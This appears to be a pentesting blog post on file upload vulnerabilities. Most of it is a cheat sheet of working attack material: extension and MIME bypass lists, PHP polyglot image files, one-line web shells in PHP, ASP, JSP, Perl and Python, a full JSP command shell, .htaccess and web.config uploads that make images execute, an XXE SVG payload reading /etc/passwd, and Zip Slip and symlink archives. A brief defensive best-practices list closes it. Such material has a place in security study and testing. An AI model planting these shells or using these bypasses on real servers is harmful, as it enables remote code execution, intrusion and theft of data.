---
layout: post
title: File Upload Vulnerabilities
date: 2025-04-10 17:16 +0300
categories: [Web Security, Server-Side Attacks]
tags: [file upload, web shell, command execution]
---

## Introduction

File upload vulnerabilities occur when web applications allow users to upload files without properly validating their type, content, size, or name. Successful exploitation can lead to:
- Remote code execution
- Cross-site scripting (XSS)
- Path traversal
- Denial of service
- Server-side request forgery (SSRF)

## File Extensions by Programming Language

### Web Shells & Server-Side Code

| Language | Common Extensions |
|----------|------------------|
| PHP | `.php`, `.php3`, `.php4`, `.php5`, `.php7`, `.phtml`, `.phps`, `.phpt`, `.phar`, `.pgif` |
| ASP | `.asp`, `.aspx`, `.config`, `.ashx`, `.asmx`, `.aspq`, `.axd`, `.cshtm`, `.cshtml` |
| JSP | `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`, `.jtml`, `.java` |
| Perl | `.pl`, `.pm`, `.cgi`, `.lib` |
| Python | `.py`, `.pyc`, `.pyo`, `.pyd`, `.wsgi`, `.pyw` |
| Ruby | `.rb`, `.rhtml`, `.rjs`, `.rxml`, `.erb`, `.rake` |
| Node.js | `.js`, `.ejs`, `.json`, `.node` |
| ColdFusion | `.cfm`, `.cfml`, `.cfc`, `.dbm` |
| Shell | `.sh`, `.bash`, `.ksh`, `.zsh` |

### Framework-Specific Extensions

| Framework | Extensions/Paths |
|-----------|------------------|
| Laravel | `.blade.php`, `/storage/logs/laravel.log` |
| Symfony | `.twig` |
| WordPress | `.wp-config.php` |
| Django | `.py`, `/settings.py` |
| Rails | `.erb`, `.rb` |
| ASP.NET | `.aspx`, `.ascx`, `.ashx`, `.asmx`, `.cshtml`, `.vbhtml` |

### Client-Side Extensions (For XSS)

| Type | Extensions |
|------|------------|
| HTML | `.html`, `.htm`, `.svg`, `.xhtml` |
| JavaScript | `.js`, `.json`, `.mjs` |
| CSS | `.css` |
| Flash | `.swf` |

## Restriction Bypass Techniques

### 1. Extension Validation Bypass

#### Double Extensions
```
malicious.php.jpg
malicious.php.png
malicious.php.gif
malicious.php.pdf
```

#### Reversed Double Extension
```
malicious.jpg.php
malicious.png.php
malicious.gif.php
```

#### Multiple Extensions
```
malicious.jpg.php.png
malicious.php.jpg.gif
```

#### Case Sensitivity
```
malicious.PhP
malicious.pHP
malicious.Php
```

#### Alternative Extensions (PHP)
```
malicious.php
malicious.php3
malicious.php4
malicious.php5
malicious.pht
malicious.phtml
shell.pHp7
```

#### Alternative Extensions (ASP)
```
malicious.asp
malicious.aspx
malicious.ashx
malicious.asmx
malicious.cer
```

#### Special Characters
```
malicious.php%00.jpg   (Null byte - works in older PHP versions)
malicious.php%20       (Space character)
malicious.php%0d%0a.jpg (CR/LF characters)
malicious.php.....     (Trailing dots, stripped in Windows)
malicious.php/         (Forward slash, works in some configurations)
malicious.php\         (Backslash, works in Windows)
malicious.php::$DATA   (Windows 8.3 filename vulnerability)
```

#### Uncommon Extensions (Language-specific)
```
file.php.xxe         (XXE files)
file.php.shtml       (SSI injection)
file.php.xss         (Cross-site scripting)
file.php.hta         (Windows HTML Apps)
file.php.config      (ASP.NET config)
shell.php;.jpg       (Semicolon bypass)
shell.php.jpg/.      (Directory exploit)
```

### 2. MIME/Content-Type Bypass

#### Common MIME Types to Forge
```
image/jpeg
image/png
image/gif
application/pdf
text/plain
audio/mpeg
video/mp4
```

#### Content-Type Manipulation
```
# Original Request
Content-Disposition: form-data; name="uploadFile"; filename="malicious.php"
Content-Type: application/x-php

# Modified Request
Content-Disposition: form-data; name="uploadFile"; filename="malicious.php"
Content-Type: image/jpeg
```

#### Content-Type Multiple Headers
```
Content-Type: image/jpeg
Content-Type: application/x-php
```

### 3. Content/Magic Bytes Validation Bypass

#### Image Magic Bytes (Hexadecimal)
```
GIF89a;  => 47 49 46 38 39 61
PNG      => 89 50 4E 47 0D 0A 1A 0A
JPG/JPEG => FF D8 FF E0
BMP      => 42 4D
```

#### Polyglot Files (Example for PHP)
```
GIF89a;
<?php system($_GET['cmd']); ?>
```

#### Polyglot Files (Example for PHP in PNG)
```
PNG
<?php system($_GET['cmd']); ?>
[PNG binary data]
```

### 4. Size Restriction Bypass

#### Minimal PHP Shell
```php
<?=`$_GET[0]`?>
<?php system($_GET[c]); ?>
```

#### Minimal JSP Shell
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

#### Minimal ASP Shell
```
<% eval request("cmd") %>
```

### 5. Client-Side Validation Bypass

#### Disabling JavaScript
- Use browser dev tools to disable JavaScript
- Use a proxy tool (Burp Suite, ZAP) to intercept and modify requests

#### Request Modification
```
# Original Form
<input type="file" name="uploadFile" accept="image/jpeg,image/png" />

# Bypass: Remove or modify accept attribute using browser dev tools
<input type="file" name="uploadFile" />
```

### 6. Server Configuration Bypass

#### .htaccess Upload (Apache)
```
# File: .htaccess
AddType application/x-httpd-php .jpg
AddHandler php-script .jpg

# Now any .jpg file will be executed as PHP
```

#### web.config Upload (IIS)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="new_policy" path="*.jpg" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\php7.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".jpg" />
            </fileExtensions>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
```

#### Nginx Configuration Bypass
```
# If configuration allows directory listing
# Upload files to a directory and navigate to it
```

### 7. Race Condition Exploits

```
1. Upload malicious file 
2. Application performs validation check
3. Access the file before validation/cleanup processes complete
```

## Advanced Bypass Techniques

### 1. Encoding and Character Sets

#### URL Encoding
```
ma%6Cicious.php -> malicious.php
shell.p%68p -> shell.php
```

#### Unicode Normalization
```
ＳｈＥＬＬ.php -> SHELL.php
shell.ｐｈｐ -> shell.php
```

### 2. File Upload + XXE Attack
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text font-size="15" x="0" y="16">&xxe;</text>
</svg>
```

### 3. ZIP-based Attacks

#### Upload and extract archive
```
# Create a symbolic link to sensitive file
ln -s /etc/passwd link
# Zip the link
zip --symlinks archive.zip link
# Upload and extract on server
```

#### Zip Slip
```
# Create zip with path traversal filenames
zip archive.zip ../../../../etc/malicious.php
```

## Exploitation Techniques by Framework

### WordPress

```
# Theme upload
Zip a malicious PHP file into a theme structure
Upload via Appearance > Themes > Add New > Upload

# Plugin upload
Zip a malicious PHP file into a plugin structure
Upload via Plugins > Add New > Upload Plugin

# Media bypass (older versions)
Upload PHP file with .jpg extension and double extension
```

### PHP Applications

```
# LFI + Upload Combo
1. Upload malicious code to log file (e.g., User-Agent)
2. Use LFI vulnerability to include log file
3. Execute payload

# PHP Filter Chain
chainable gadgets for exploitation, especially with phar:// wrapper
```

### ASP.NET Applications

```
# Web.config upload
Upload a web.config file that maps new extensions to ASP.NET handler

# ViewState RCE
If machine key is known, craft an upload with malicious deserialization payload
```

### Java Applications

```
# JSP Shell
<%@ page import="java.util.*,java.io.*"%>
<%
Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) { out.println(disr); disr = dis.readLine(); }
%>

# JAR/WAR upload
Package malicious JSP in JAR/WAR file for deployment
```

## Common Upload Security Implementations & Bypasses

### Defense Mechanisms and Bypasses

| Defense Mechanism | Bypass Technique |
|-------------------|------------------|
| Extension Blacklist | Use uncommon extensions, double extensions, or special characters |
| Extension Whitelist | Try variations of allowed extensions, case variations, or config uploads |
| Content-Type Validation | Modify Content-Type header in request |
| Content Validation | Add magic bytes to file while keeping executable code |
| File Size Limits | Create minimal shells under size limit |
| Image Dimension Check | Create valid image with embedded code |

## Tools for Testing File Upload Vulnerabilities

1. **Burp Suite** - HTTP proxy for intercepting and modifying requests
2. **OWASP ZAP** - Alternative security proxy
3. **ExifTool** - Manipulate file metadata 
4. **FUFF** - Web fuzzer for testing upload endpoints
5. **Weevely** - PHP web shell generator
6. **Upload Scanner** - Burp Suite extension for file upload testing

## Quick Payloads (Web Shells)

### PHP One-liner
```php
<?php system($_GET['cmd']); ?>
```

### ASP One-liner
```
<% eval request("cmd") %>
```

### JSP One-liner
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

### Perl One-liner
```perl
#!/usr/bin/perl
print "Content-type: text/html\n\n";
system($ENV{'QUERY_STRING'});
```

### Python One-liner
```python
import os;os.system(os.getenv('QUERY_STRING'))
```

## File Upload Defense Best Practices

1. Implement strong file type validation
   - Check file extensions AND content
   - Use content validation libraries

2. Store uploaded files outside web root
   - Prevent direct access to uploaded files

3. Rename files during upload
   - Use random names + sanitize filenames
   - Strip special characters

4. Set proper permissions
   - Make uploaded files non-executable

5. Use separate domains for user content
   - Isolate uploaded content from main application

6. Implement file scanning
   - Scan for malware and malicious code

7. Validate image dimensions for image uploads
   - Ensure proper image properties

8. Implement file size limits
   - Prevent DOS via large file uploads

9. Use CDN or dedicated storage services
   - AWS S3, Azure Blob Storage, etc.

## References

- [OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [PortSwigger - File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
- [HackTricks - File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)
- [PayloadsAllTheThings - Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)


